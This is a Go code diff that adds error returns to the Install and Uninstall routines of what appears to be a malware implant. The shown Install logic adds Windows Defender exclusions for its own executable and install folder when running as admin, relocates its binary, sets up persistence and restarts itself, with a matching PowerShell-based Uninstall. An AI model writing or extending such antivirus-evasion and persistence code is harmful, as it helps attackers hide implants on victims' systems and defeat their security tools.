@@ -130,7 +130,7 @@ func calm() {
 
 // Install attempts to deploy the binary to the system and establish persistence.
 // It also assembles the install configuration and saves it.
-func Install() {
+func Install() error {
 	defer calm()
 	Info.Date = time.Now()
 
@@ -142,6 +142,7 @@ func Install() {
 		admin = true
 		if err = AddDefenderExclusion(os.Args[0]); err != nil {
 			log.Println("Adding temporary exclusion failed,", err)
+			return err
 		} else {
 			log.Println("Temporary exclusion added successfully")
 		}
@@ -155,6 +156,7 @@ func Install() {
 	if admin {
 		if err = AddDefenderExclusion(base); err != nil {
 			log.Println("Adding base exclusion failed,", err)
+			return err
 		} else {
 			Info.Exclusion = true
 			log.Println("Base exclusion added successfully")
@@ -164,6 +166,7 @@ func Install() {
 	err = CopyExecutable()
 	if err != nil {
 		log.Println("Binary relocation failed,", err)
+		return err
 	} else {
 		log.Println("Binary relocation successful")
 	}
@@ -174,7 +177,7 @@ func Install() {
 			Info.PType = i
 			break
 		} else {
-			log.Println(i, err)
+			return err
 		}
 	}
 
@@ -191,10 +194,11 @@ func Install() {
 
 	log.Println("Install complete")
 	Restart("")
+	return nil
 }
 
 // Uninstall attempts to undo all of the changes done to the system by Install.
-func Uninstall() []string {
+func Uninstall() ([]string, error) {
 	r := make([]string, 5)
 	for i := range r {
 		r[i] = "✔️"
@@ -225,7 +229,7 @@ func Uninstall() []string {
 		runPowershellInternal(cmd, true)
 	}()
 
-	return r
+	return r, nil
 }
 
 func Restart(arg string) {
